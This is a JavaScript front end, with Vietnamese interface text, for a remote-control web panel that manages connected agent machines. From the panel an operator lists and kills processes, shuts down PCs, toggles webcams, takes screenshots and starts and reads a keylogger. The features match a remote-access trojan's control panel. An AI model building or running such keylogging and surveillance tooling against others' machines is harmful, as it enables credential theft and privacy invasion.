/* ===================================
   Remote Control - Main JavaScript
   =================================== */

// Global variables
let selectedAgentId = null;
let allProcesses = [];
let currentScreenshot = null;
let keylogAutoRefreshInterval = null;

// ==================== AGENTS ====================

// Refresh agents list
async function refreshAgents() {
    try {
        const response = await fetch('/api/agents');
        const agents = await response.json();
        
        const container = document.getElementById('agentsList');
        if (agents.length === 0) {
            container.innerHTML = '<p class="text-muted text-center">Chưa có máy nào kết nối</p>';
            return;
        }

        container.innerHTML = agents.map(agent => `
            <div class="agent-card ${agent.id === selectedAgentId ? 'active' : ''}" 
                 onclick="selectAgent('${agent.id}', '${agent.ipAddress}')">
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <i class="bi bi-pc-display"></i>
                        <strong>${agent.ipAddress}</strong>
                    </div>
                    <span class="status-online">●</span>
                </div>
                <small class="text-muted">ID: ${agent.id}</small>
            </div>
        `).join('');
    } catch (error) {
        showToast('Lỗi kết nối server', 'danger');
    }
}

// Select an agent
function selectAgent(agentId, ipAddress) {
    selectedAgentId = agentId;
    document.getElementById('selectedAgent').textContent = `${ipAddress} (${agentId})`;
    document.getElementById('noAgentMessage').style.display = 'none';
    document.getElementById('controlPanel').style.display = 'block';
    refreshAgents();
    listApps();
}

// ==================== APPLICATIONS ====================

// List applications
async function listApps() {
    if (!selectedAgentId) return;
    
    document.getElementById('appsLoading').style.display = 'block';
    document.getElementById('appsList').innerHTML = '';
    
    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/apps`);
        const result = await response.json();
        
        console.log('Apps result:', result);
        
        if (result.success) {
            const data = result.Data || result.data;
            if (data) {
                const apps = JSON.parse(data);
                document.getElementById('appsList').innerHTML = apps.map(app => `
                <tr>
                    <td><strong>${app.Name}</strong></td>
                    <td>${app.Title}</td>
                    <td><code>${app.Id}</code></td>
                    <td>${app.Threads}</td>
                    <td>${app.Memory}</td>
                    <td>
                        <button class="btn btn-danger btn-sm" onclick="killProcess(${app.Id}, '${app.Name}')">
                            <i class="bi bi-x-circle"></i> Dừng
                        </button>
                    </td>
                </tr>
            `).join('');
            } else {
                showToast('Không có dữ liệu apps', 'warning');
            }
        } else {
            showToast(result.message || 'Lỗi lấy danh sách', 'danger');
        }
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
    
    document.getElementById('appsLoading').style.display = 'none';
}

// ==================== PROCESSES ====================

// List all processes
async function listProcesses() {
    if (!selectedAgentId) return;
    
    document.getElementById('processesLoading').style.display = 'block';
    document.getElementById('processesList').innerHTML = '';
    
    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/processes`);
        const result = await response.json();
        
        console.log('Processes result:', result);
        
        if (result.success) {
            const data = result.Data || result.data;
            if (data) {
                try {
                    allProcesses = JSON.parse(data);
                    console.log('Parsed processes:', allProcesses.length);
                    renderProcesses(allProcesses);
                } catch (parseError) {
                    console.error('Parse error:', parseError);
                    showToast('Lỗi phân tích dữ liệu', 'danger');
                }
            } else {
                showToast('Không có dữ liệu processes', 'warning');
            }
        } else {
            showToast(result.Message || result.message || 'Lỗi lấy danh sách', 'danger');
        }
    } catch (error) {
        console.error('Fetch error:', error);
        showToast('Lỗi kết nối: ' + error.message, 'danger');
    }
    
    document.getElementById('processesLoading').style.display = 'none';
}

function renderProcesses(processes) {
    document.getElementById('processesList').innerHTML = processes.map(p => `
        <tr>
            <td><strong>${p.Name}</strong></td>
            <td><code>${p.Id}</code></td>
            <td>${p.Threads}</td>
            <td>${p.Memory}</td>
            <td>
                <button class="btn btn-danger btn-sm" onclick="killProcess(${p.Id}, '${p.Name}')">
                    <i class="bi bi-x-circle"></i> Kill
                </button>
            </td>
        </tr>
    `).join('');
}

function filterProcesses() {
    const search = document.getElementById('processSearch').value.toLowerCase();
    const filtered = allProcesses.filter(p => p.Name.toLowerCase().includes(search));
    renderProcesses(filtered);
}

// ==================== START/KILL PROCESS ====================

function showStartDialog() {
    new bootstrap.Modal(document.getElementById('startModal')).show();
}

// Quick start app from button
async function quickStart(appName) {
    if (!selectedAgentId) return;
    
    try {
        showToast(`Đang mở ${appName}...`, 'info');
        const response = await fetch(`/api/agents/${selectedAgentId}/start`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ processName: appName })
        });
        const result = await response.json();
        
        if (result.success) {
            showToast(`Đã mở ${appName}`, 'success');
            setTimeout(() => listApps(), 1000);
        } else {
            showToast(result.data || 'Lỗi khởi động', 'danger');
        }
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

async function startProcess() {
    if (!selectedAgentId) return;
    
    const processName = document.getElementById('processNameInput').value.trim();
    if (!processName) {
        showToast('Vui lòng nhập tên ứng dụng', 'warning');
        return;
    }

    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/start`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ processName })
        });
        const result = await response.json();
        
        if (result.success) {
            showToast('Đã khởi động ứng dụng', 'success');
            bootstrap.Modal.getInstance(document.getElementById('startModal')).hide();
            document.getElementById('processNameInput').value = '';
            setTimeout(() => listApps(), 1000);
        } else {
            showToast(result.data || 'Lỗi khởi động', 'danger');
        }
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// Kill process
async function killProcess(processId, processName) {
    if (!selectedAgentId) return;
    if (!confirm(`Bạn có chắc muốn dừng "${processName}" (PID: ${processId})?`)) return;

    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/kill`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ processId })
        });
        const result = await response.json();
        
        if (result.success) {
            showToast('Đã dừng process', 'success');
            listApps();
            listProcesses();
        } else {
            showToast(result.data || 'Lỗi dừng process', 'danger');
        }
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// ==================== POWER ====================

// Shutdown
async function shutdownPC() {
    if (!selectedAgentId) return;
    if (!confirm('Bạn có chắc muốn TẮT máy tính này?')) return;

    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/shutdown`, {
            method: 'POST'
        });
        const result = await response.json();
        showToast(result.data || 'Lệnh đã được gửi', result.success ? 'success' : 'danger');
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// Restart
async function restartPC() {
    if (!selectedAgentId) return;
    if (!confirm('Bạn có chắc muốn KHỞI ĐỘNG LẠI máy tính này?')) return;

    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/restart`, {
            method: 'POST'
        });
        const result = await response.json();
        showToast(result.data || 'Lệnh đã được gửi', result.success ? 'success' : 'danger');
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// ==================== WEBCAM ====================

// Disable Webcam
async function disableWebcam() {
    if (!selectedAgentId) return;
    if (!confirm('Bạn có chắc muốn TẮT webcam trên máy này?')) return;

    try {
        showToast('Đang tắt webcam...', 'info');
        const response = await fetch(`/api/agents/${selectedAgentId}/disable-webcam`, {
            method: 'POST'
        });
        const result = await response.json();
        showToast(result.data || 'Lệnh đã được gửi', result.success ? 'success' : 'danger');
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// Enable Webcam
async function enableWebcam() {
    if (!selectedAgentId) return;
    if (!confirm('Bạn có chắc muốn BẬT webcam trên máy này?')) return;

    try {
        showToast('Đang bật webcam...', 'info');
        const response = await fetch(`/api/agents/${selectedAgentId}/enable-webcam`, {
            method: 'POST'
        });
        const result = await response.json();
        showToast(result.data || 'Lệnh đã được gửi', result.success ? 'success' : 'danger');
    } catch (error) {
        showToast('Lỗi kết nối', 'danger');
    }
}

// ==================== SCREENSHOT ====================

async function takeScreenshot() {
    if (!selectedAgentId) return;

    document.getElementById('screenshotLoading').style.display = 'block';
    document.getElementById('noScreenshot').style.display = 'none';
    document.getElementById('screenshotImage').style.display = 'none';
    document.getElementById('screenshotInfo').style.display = 'none';

    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/screenshot`);
        const result = await response.json();
        
        document.getElementById('screenshotLoading').style.display = 'none';

        if (result.success && (result.Type === 'SCREENSHOT' || result.type === 'SCREENSHOT')) {
            const base64Data = result.Data || result.data;
            if (base64Data) {
                currentScreenshot = 'data:image/jpeg;base64,' + base64Data;
                document.getElementById('screenshotImage').src = currentScreenshot;
                document.getElementById('screenshotModalImage').src = currentScreenshot;
                document.getElementById('screenshotImage').style.display = 'block';
                document.getElementById('screenshotInfo').style.display = 'block';
                document.getElementById('screenshotTime').textContent = 'Chụp lúc: ' + new Date().toLocaleString('vi-VN');
                showToast('Đã chụp màn hình', 'success');
            } else {
                document.getElementById('noScreenshot').style.display = 'block';
                showToast('Không có dữ liệu ảnh', 'danger');
            }
        } else {
            document.getElementById('noScreenshot').style.display = 'block';
            showToast(result.Data || result.data || result.Message || 'Không thể chụp màn hình', 'danger');
        }
    } catch (error) {
        document.getElementById('screenshotLoading').style.display = 'none';
        document.getElementById('noScreenshot').style.display = 'block';
        showToast('Lỗi kết nối', 'danger');
    }
}

function downloadScreenshot() {
    if (!currentScreenshot) return;
    
    const link = document.createElement('a');
    link.href = currentScreenshot;
    link.download = 'screenshot_' + new Date().toISOString().replace(/[:.]/g, '-') + '.jpg';
    link.click();
}

function openScreenshotFullscreen() {
    if (!currentScreenshot) return;
    new bootstrap.Modal(document.getElementById('screenshotModal')).show();
}

// ==================== KEYLOGGER ====================

async function startKeylogger() {
    if (!selectedAgentId) {
        showToast('Vui lòng chọn máy tính trước!', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/start-keylogger`, {
            method: 'POST'
        });
        
        if (response.ok) {
            showToast('Đã bắt đầu ghi phím!', 'success');
        } else {
            showToast('Lỗi khi bắt đầu keylogger', 'danger');
        }
    } catch (err) {
        showToast('Lỗi kết nối: ' + err.message, 'danger');
    }
}

async function stopKeylogger() {
    if (!selectedAgentId) {
        showToast('Vui lòng chọn máy tính trước!', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/stop-keylogger`, {
            method: 'POST'
        });
        
        if (response.ok) {
            showToast('Đã dừng ghi phím!', 'success');
            document.getElementById('autoRefreshKeylog').checked = false;
            toggleKeylogAutoRefresh();
        } else {
            showToast('Lỗi khi dừng keylogger', 'danger');
        }
    } catch (err) {
        showToast('Lỗi kết nối: ' + err.message, 'danger');
    }
}

async function getKeylog() {
    if (!selectedAgentId) {
        showToast('Vui lòng chọn máy tính trước!', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/agents/${selectedAgentId}/keylog`);
        const result = await response.json();
        
        console.log('Keylog result:', result);
        
        const keylogOutput = document.getElementById('keylogOutput');
        if (result.success) {
            const data = result.Data || result.data || '';
            keylogOutput.value = data || '(Chưa có phím nào được ghi)';
            keylogOutput.scrollTop = keylogOutput.scrollHeight;
        } else {
            showToast(result.Message || result.message || 'Lỗi lấy keylog', 'danger');
        }
    } catch (err) {
        console.error('Keylog error:', err);
        showToast('Lỗi kết nối: ' + err.message, 'danger');
    }
}

function toggleKeylogAutoRefresh() {
    const isChecked = document.getElementById('autoRefreshKeylog').checked;
    
    if (isChecked) {
        getKeylog();
        keylogAutoRefreshInterval = setInterval(getKeylog, 2000);
    } else {
        if (keylogAutoRefreshInterval) {
            clearInterval(keylogAutoRefreshInterval);
            keylogAutoRefreshInterval = null;
        }
    }
}

function clearKeylogDisplay() {
    document.getElementById('keylogOutput').value = '';
}

// ==================== UTILITIES ====================

// Toast notification
function showToast(message, type = 'info') {
    const container = document.getElementById('toastContainer');
    const id = 'toast-' + Date.now();
    
    const icons = {
        success: 'check-circle',
        danger: 'x-circle',
        warning: 'exclamation-triangle',
        info: 'info-circle'
    };

    container.innerHTML += `
        <div id="${id}" class="toast show" role="alert">
            <div class="toast-header bg-${type} text-white">
                <i class="bi bi-${icons[type]} me-2"></i>
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast"></button>
            </div>
            <div class="toast-body">${message}</div>
        </div>
    `;

    setTimeout(() => {
        document.getElementById(id)?.remove();
    }, 5000);
}

// ==================== INITIALIZATION ====================

// Auto refresh agents every 10 seconds
setInterval(refreshAgents, 10000);

// Initial load
document.addEventListener('DOMContentLoaded', function() {
    refreshAgents();
});
